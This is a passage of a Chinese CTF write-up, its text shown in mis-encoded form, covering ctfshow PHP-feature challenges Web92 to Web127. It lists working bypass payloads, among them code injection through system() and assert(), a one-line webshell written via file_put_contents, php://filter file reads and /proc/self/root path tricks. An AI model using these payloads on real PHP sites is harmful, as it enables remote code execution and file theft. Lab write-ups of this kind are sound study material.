class="line">å¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ; </span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">é…åˆå‡½æ•°<span class="title function_ invoke__">preg_replace</span>()ä½¿ç”¨, å¯ä»¥æŠŠåŒ¹é…æ¥çš„å­—ç¬¦ä¸²å½“ä½œæ­£åˆ™è¡¨è¾¾å¼æ‰§è¡Œ; </span><br></pre></td></tr></table></figure>

<p>ç›´æ¥%0aç»•è¿‡å³å¯</p>
<h1 id="Web92"><a href="#Web92" class="headerlink" title="Web92"></a>Web92</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval()å‡½æ•°å¦‚æœ$baseä¸º0åˆ™$varä¸­å­˜åœ¨å­—æ¯çš„è¯é‡åˆ°å­—æ¯å°±åœæ­¢è¯»å– ä½†æ˜¯eè¿™ä¸ªå­—æ¯æ¯”è¾ƒç‰¹æ®Šï¼Œå¯ä»¥åœ¨PHPä¸­ä¸æ˜¯ç§‘å­¦è®¡æ•°æ³•ã€‚æ‰€ä»¥ä¸ºäº†ç»•è¿‡å‰é¢çš„==4476æˆ‘ä»¬å°±å¯ä»¥æ„é€  4476e123</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š?num=0x117c</span><br><span class="line"></span><br><span class="line">è¿™é‡Œæˆ‘é‡‡ç”¨çš„æ˜¯16è¿›åˆ¶ç»•è¿‡</span><br><span class="line"></span><br><span class="line">è¿›åˆ¶ç»•è¿‡</span><br></pre></td></tr></table></figure>

<h1 id="Web93"><a href="#Web93" class="headerlink" title="Web93"></a>Web93</h1><p>å¯ä»¥ä½¿ç”¨åˆ«çš„è¿›åˆ¶å³å¯ï¼Œä¸è¿‡åƒä¸‡è¦æ³¨æ„è¿›åˆ¶çš„å‰ç¼€ï¼Œä¸ç„¶å°±ä¼šé»˜è®¤å½“æˆåè¿›åˆ¶å»è¿ç®—äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.0B è¡¨ç¤ºäºŒè¿›åˆ¶çš„å‰ç¼€</span><br><span class="line">2.0O è¡¨ç¤ºå…«è¿›åˆ¶çš„å‰ç¼€ ä¹Ÿå¯ä»¥ä½¿ç”¨0è¡¨ç¤ºå…«è¿›åˆ¶çš„å‰ç¼€</span><br><span class="line">4.0x è¿™ä¸ªæ˜¯åå…­è¿›åˆ¶çš„å‰ç¼€ 0xæ˜¯16è¿›åˆ¶çš„å‰ç¼€ï¼ŒHæ˜¯16è¿›åˆ¶çš„åç¼€</span><br></pre></td></tr></table></figure>

<h1 id="Web94"><a href="#Web94" class="headerlink" title="Web94"></a>Web94</h1><p>è¿‡æ»¤äº†ç¬¬ä¸€ä¸ªæ•°å­—ä¸º0çš„æƒ…å†µï¼Œæ‰€ä»¥å°±æ— æ³•ä½¿ç”¨å…«è¿›åˆ¶å»ç»•è¿‡äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å°æ•°å³å¯ã€‚</p>
<h1 id="Web95"><a href="#Web95" class="headerlink" title="Web95"></a>Web95</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯ä»¥é€šè¿‡8è¿›åˆ¶ç»•è¿‡ä½†æ˜¯å‰é¢å¿…é¡»å¤šåŠ ä¸€ä¸ªå­—èŠ‚ï¼ˆåŠ å·ç©ºæ ¼éƒ½è¡Œï¼‰ ?num=+010574æˆ–è€…?num=%2b010574</span><br></pre></td></tr></table></figure>

<h1 id="Web96"><a href="#Web96" class="headerlink" title="Web96"></a>Web96</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./flag.php   ./å½“å‰ç›®å½•</span><br><span class="line">/var/www/html/flag.php</span><br><span class="line">php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="Web97"><a href="#Web97" class="headerlink" title="Web97"></a>Web97</h1><p>md5æ•°ç»„ç»•è¿‡å³å¯ï¼Œæˆ–è€…md5å¼ºå¼±ç¢°æ’éƒ½è¡Œ</p>
<h1 id="Web98"><a href="#Web98" class="headerlink" title="Web98"></a>Web98</h1><p>æ—¢ç„¶getä¼ å…¥çš„å€¼ä¼šè¢«å®šä½æŒ‡å‘åˆ°postæ‰€å¯¹åº”çš„å€¼ï¼Œé‚£ä¹ˆåªéœ€è¦æœ‰getå­˜åœ¨å³å¯ï¼ŒåŒæ—¶postä¼ å…¥HTTP_FLAG&#x3D;flagå°±å¯ä»¥äº†</p>
<h1 id="Web99"><a href="#Web99" class="headerlink" title="Web99"></a>Web99</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();<span class="comment">//è®¾ç½®ä¸ºæ•°ç»„</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));<span class="comment">//å‘æ•°ç»„é‡Œé¢æ’å…¥éšæœºæ•°</span></span><br><span class="line">&#125; i</span><br><span class="line"><span class="title function_ invoke__">f</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line"><span class="comment">//in_array()å‡½æ•°æœ‰æ¼æ´ æ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•° å°±å¯ä»¥å½¢æˆè‡ªåŠ¨è½¬æ¢eg:n=1.phpè‡ªåŠ¨è½¬æ¢ä¸º1</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="comment">//å†™å…¥1.phpæ–‡ä»¶ å†…å®¹æ˜¯&lt;?php system($_POST[1]);?&gt;</span></span><br><span class="line">&#125; ?</span><br><span class="line">&gt;</span><br><span class="line">payload: get : ?n=<span class="number">1</span>.php post:content=</span><br></pre></td></tr></table></figure>

<p>å¾ˆç®€å•çš„ä¸€é“é¢˜ç›®</p>
<h1 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$ctfshow</span>)&amp;v3=;</span><br><span class="line">v1=<span class="number">1</span>&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ctfshow.php&quot;</span>)<span class="comment">/*&amp;v3=*/</span>;</span><br><span class="line">?v1=<span class="number">21</span>&amp;v2=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$ctfshow</span>)<span class="comment">/*&amp;v3=*/</span>;</span><br></pre></td></tr></table></figure>

<h1 id="Web101"><a href="#Web101" class="headerlink" title="Web101"></a>Web101</h1><p>è¿™é‡Œéœ€è¦ç”¨åˆ°phpåå°„ç±»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>

<h1 id="Web102"><a href="#Web102" class="headerlink" title="Web102"></a>Web102</h1><p>åˆ©ç”¨base64ï¼ŒåŒæ—¶é…åˆä¼ªåè®®å»å†™å…¥ï¼Œä½†æ˜¯éœ€è¦ä¿è¯é€šè¿‡is_numberå‡½æ•°çš„åˆ¤æ–­ï¼Œå¯ä»¥æœ‰å­—æ¯å•Šï¼Œä½†æ˜¯å¿…å¾—æ˜¯eå•Šï¼Œä¹Ÿå°±æ˜¯ç§‘å­¦è®¡æ•°æ³•å•Šï¼Œæ¥è‡ªåŒä¸€å®¶çš„payloadå•Šï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;&lt;?=`cat *`;&#x27;;</span><br><span class="line">$b=base64_encode($a);  // PD89YGNhdCAqYDs=</span><br><span class="line">$c=bin2hex($b);      //è¿™é‡Œç›´æ¥ç”¨å»æ‰=çš„base64</span><br><span class="line">è¾“å‡º   5044383959474e6864434171594473</span><br><span class="line"></span><br><span class="line">å¸¦eçš„è¯ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œå¯ä»¥é€šè¿‡is_numericæ£€æµ‹ã€‚</span><br><span class="line">å¤§å®¶å¯ä»¥å°è¯•ä¸‹å»æ‰=å’Œå¸¦ç€=çš„base64è§£ç å‡ºæ¥çš„å†…å®¹æ˜¯ç›¸åŒçš„ã€‚å› ä¸ºç­‰å·åœ¨base64ä¸­åªæ˜¯èµ·åˆ°å¡«å……çš„ä½œç”¨ï¼Œä¸å½±å“å…·ä½“çš„æ•°æ®å†…å®¹ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>

<p>postï¼šv1&#x3D;hex2bin</p>
<p>ç„¶åè®¿é—®1.phpå»è§¦å‘å°±å¯ä»¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ³¨æ„åŒºåˆ«bin2hexå’Œhex2bin</span><br></pre></td></tr></table></figure>

<h1 id="Web103"><a href="#Web103" class="headerlink" title="Web103"></a>Web103</h1><p>å’Œä¸Šé¢˜ä¸€æ ·çš„åšæ³•å³å¯</p>
<h1 id="Web104"><a href="#Web104" class="headerlink" title="Web104"></a>Web104</h1><p>sha1ç»•è¿‡</p>
<p>å’Œmd5ç»•è¿‡ä¸€æ ·çš„</p>
<h1 id="Web105"><a href="#Web105" class="headerlink" title="Web105"></a>Web105</h1><p>è¿™é¢˜å°±æ˜¯å¾ˆç®€å•çš„å˜é‡ä¼ é€’å³å¯ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?suces=flag</span><br><span class="line">postï¼šerror=suces</span><br></pre></td></tr></table></figure>

<h1 id="Web106"><a href="#Web106" class="headerlink" title="Web106"></a>Web106</h1><p>è¿˜æ˜¯å’Œ104ä¸€æ ·çš„sha1ç»•è¿‡1</p>
<h1 id="Web107"><a href="#Web107" class="headerlink" title="Web107"></a>Web107</h1><p>ç¬¬ä¸€ç§æ–¹æ³•</p>
<p>åˆ©ç”¨md5ç¢°æ’ï¼šä½¿å¾—v1ä¸­çš„flag&#x3D;0ï¼Œç„¶åv3&#x3D;0(md5(QNKCDZO)&#x3D;0eâ€¦)</p>
<p>payloadï¼š<code>vl=flag=0ï¼Œv3=QNKCDZO)</code></p>
<p>ç¬¬äºŒç§æ–¹æ³•</p>
<p>æ•°ç»„ç»•è¿‡å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v3[]=2&amp;flag[]=32</span><br><span class="line">postï¼šv1=v2=$_GET</span><br></pre></td></tr></table></figure>

<h1 id="Web108"><a href="#Web108" class="headerlink" title="Web108"></a>Web108</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ereg()é™åˆ¶passwordçš„æ ¼å¼ï¼Œåªèƒ½æ˜¯æ•°å­—æˆ–è€…å­—æ¯ã€‚ä½†ereg()å‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨%00ç»•è¿‡éªŒè¯ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â‘ %00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸ</span><br><span class="line"></span><br><span class="line">â‘¡å½“ntfä¸ºæ•°ç»„æ—¶å®ƒçš„è¿”å›å€¼ä¸æ˜¯FALSE</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜è¿˜è¦æ³¨æ„<a target="_blank" rel="noopener" href="https://www.php.net/strrev">strrevå‡½æ•°</a>ï¼Œåè½¬å­—ç¬¦ä¸²</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=a%00778</span><br></pre></td></tr></table></figure>

<h1 id="Web109"><a href="#Web109" class="headerlink" title="Web109"></a>Web109</h1><p>è¿™é¢˜ä½¿ç”¨åå°„ç±»å³å¯å¾ˆç®€å•çš„å®Œæˆäº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=ReflectionClass&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure>

<p>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨åˆ«çš„æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=Exception&amp;v2=system(&#x27;cat fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure>

<p>æ€»ç»“</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="built_in">Exception</span>();<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="comment">//&amp;v2=a</span></span><br><span class="line">?v1=ReflectionClass&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">?v1=<span class="title function_ invoke__">ReflectionClass</span>(<span class="string">&quot;PDO&quot;</span>);<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="comment">//&amp;v2=a</span></span><br></pre></td></tr></table></figure>

<h1 id="Web110"><a href="#Web110" class="headerlink" title="Web110"></a>Web110</h1><p>FilesystemIteratorè·å–ç›®å½•æ–‡ä»¶</p>
<p>getcwd()å‡½æ•°å–å¾—å½“å‰å·¥ä½œç›®å½•</p>
<p><strong>æ„é€ playloadï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å½“å‰ç›®å½•çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åå­—ï¼šfl36dga.txtï¼Œç„¶åè®¿é—®å³å¯ï¼Œç¼ºé™·ï¼šåªèƒ½è·å–ç¬¬ä¸€ä¸ªæ–‡ä»¶åå­—</p>
<h1 id="Web111"><a href="#Web111" class="headerlink" title="Web111"></a>Web111</h1><p>ä¸»è¦æ˜¯å…¨å±€å˜é‡</p>
<p>è¾“å‡ºGLOBALSå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=sctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>

<h1 id="Web112"><a href="#Web112" class="headerlink" title="Web112"></a>Web112</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å¯ä»¥ç›´æ¥ç”¨ä¸å¸¦ä»»ä½•è¿‡æ»¤å™¨çš„filterä¼ªåè®®</span><br><span class="line">file=php://filter/resource=flag.php</span><br><span class="line">ä¹Ÿå¯ä»¥ç”¨ä¸€äº›æ²¡æœ‰è¿‡æ»¤æ‰çš„ç¼–ç æ–¹å¼å’Œè½¬æ¢æ–¹å¼</span><br><span class="line">file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">file=compress.zlib://flag.php</span><br><span class="line">â†‘è¿™æ˜¯è¯»å–å‹ç¼©æµ</span><br><span class="line">file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span><br><span class="line">file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">â†‘è¿™æ˜¯ä¸¤ä½ä¸€åè½¬çš„è¯»å–æ–¹å¼</span><br></pre></td></tr></table></figure>

<h1 id="Web113"><a href="#Web113" class="headerlink" title="Web113"></a>Web113</h1><p>è¿™æ¥ç€ä¸Šé¢æŠŠfilterç¦æ‰äº†</p>
<p>åˆ©ç”¨ä¸Šä¸€é“é¢˜ç›®çš„payloadå¯ä»¥ç»§ç»­æ‰“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ç›®å½•æº¢å‡ºæ¥åš</p>
<p>inuxé‡Œ<code>/proc/self/root</code>æ˜¯æŒ‡å‘æ ¹ç›®å½•çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥<code>ls /proc/self/root</code>ï¼Œå…¶å®æ˜¾ç¤ºçš„å†…å®¹æ˜¯æ ¹ç›®å½•ä¸‹çš„å†…å®¹<br>å¤šæ¬¡é‡å¤åç»•è¿‡<code>is_file</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="Web114"><a href="#Web114" class="headerlink" title="Web114"></a>Web114</h1><p>æŠŠfilteråˆæ”¾å‡ºæ¥äº†ï¼Œç›´æ¥å†™å°±è¡Œ</p>
<h1 id="Web115"><a href="#Web115" class="headerlink" title="Web115"></a>Web115</h1><p>è¿™é¢˜éœ€è¦å†™ä¸€ä¸ªè„šæœ¬å»æ‰¾åˆ°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">129</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;36&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) &amp;&amp; <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ï¼š<code>%0C %2B(+) - . 0 1 2 3 4 5 6 7 8 9</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š%0C36</span><br></pre></td></tr></table></figure>

<h1 id="Web123"><a href="#Web123" class="headerlink" title="Web123"></a>Web123</h1><p>æ­¤å¤„çš„phpç‰¹æ€§ï¼šåœ¨phpä¸­å˜é‡åå­—æ˜¯ç”±æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿ç»„æˆçš„ï¼Œæ‰€ä»¥ä¸è®ºç”¨postè¿˜æ˜¯getä¼ å…¥å˜é‡åçš„æ—¶å€™éƒ½å°†ç©ºæ ¼ã€+ã€ç‚¹ã€[è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œä½†æ˜¯ç”¨ä¸€ä¸ªç‰¹æ€§æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œå°±æ˜¯å½“[æå‰å‡ºç°åï¼Œåé¢çš„ç‚¹å°±ä¸ä¼šå†è¢«è½¬ä¹‰äº†ï¼Œsuch asï¼šCTF[SHOW.COM&#x3D;&gt;CTF_SHOW.COM</p>
<p>payloadï¼šCTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;echo $flag</p>
<h1 id="Web125"><a href="#Web125" class="headerlink" title="Web125"></a>Web125</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&quot;QUERY_STRING&quot;]  è·å–æŸ¥è¯¢ è¯­å¥ï¼Œå®ä¾‹ä¸­å¯çŸ¥ï¼Œè·å–çš„æ˜¯?åé¢çš„å€¼</span><br><span class="line">$_SERVER[&quot;REQUEST_URI&quot;]   è·å– http://localhost åé¢çš„å€¼ï¼ŒåŒ…æ‹¬/</span><br><span class="line">$_SERVER[&quot;SCRIPT_NAME&quot;]   è·å–å½“å‰è„šæœ¬çš„è·¯å¾„ï¼Œå¦‚ï¼šindex.php</span><br><span class="line">$_SERVER[&quot;PHP_SELF&quot;]      å½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0]) # POST</span><br><span class="line">?$fl0g=flag_give_me; #GET</span><br><span class="line">CTF_SHOW=6&amp;CTF[SHOW.COM=6&amp;fun=highlight_file($_GET[1])    #POST</span><br><span class="line">?1=flag.php		#GET</span><br></pre></td></tr></table></figure>

<p>ç°å°†å˜é‡fl0gèµ‹å€¼ï¼Œå†å»æ‰§è¡Œå‘½ä»¤</p>
<h1 id="Web126"><a href="#Web126" class="headerlink" title="Web126"></a>Web126</h1><p>å’Œä¸Šé¢˜åŸºæœ¬ä¸€æ ·çš„</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>() æ–­è¨€ï¼š</span><br><span class="line"></span><br><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] )</span><br><span class="line"></span><br><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] )</span><br><span class="line"></span><br><span class="line">å¦‚æœ assertion æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« <span class="title function_ invoke__">assert</span>() å½“åš PHP ä»£ç æ¥æ‰§è¡Œ</span><br><span class="line">å¯è§ï¼Œ<span class="keyword">eval</span>å’Œassertéƒ½å¯ä»¥å°†å­—ç¬¦å½“ä½œä»£ç æ‰§è¡Œï¼Œåªä¸è¿‡assertä¸éœ€è¦ä¸¥æ ¼éµä»è¯­æ³•ï¼Œæ¯”å¦‚è¯­å¥æœ«å°¾çš„åˆ†å·å¯ä¸åŠ </span><br><span class="line">?<span class="variable">$fl0g</span>=flag_give_me</span><br><span class="line">CTF_SHOW=<span class="number">6</span>&amp;CTF[SHOW.COM=<span class="number">6</span>&amp;fun=<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<h1 id="Web127"><a href="#Web127" class="headerlink" title="Web127"></a>Web127</h1><p>?ctf_show&#x3D;ilove36dä½†æ˜¯ä¸‹åˆ’çº¿è¢«è¿‡æ»¤äº†</p>
<p>è‡ªå·±å†™ä¸ªfuzzè„šæœ¬è·‘ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">129</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="variable">$num</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;æœªç¼–ç ï¼š&quot;</span>.<span class="variable">$num</span>.<span class="string">&quot;   ç»è¿‡ç¼–ç ï¼š&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬çš„ç›®çš„æ˜¯åˆ©ç”¨ç©ºæ ¼ã€ç‚¹ã€å·¦ä¸­æ‹¬å·ã€+æ¥è¢«è‡ªåŠ¨è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œç»è¿‡fuzzå¾—åˆ°ç©ºæ ¼ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ç©ºæ ¼ç»è¿‡URLç¼–ç ç¡®æ˜¯+ï¼Œä½†æ˜¯%20ç¡®å®ç¬¦åˆè¯¥é¢˜ç›®</p>
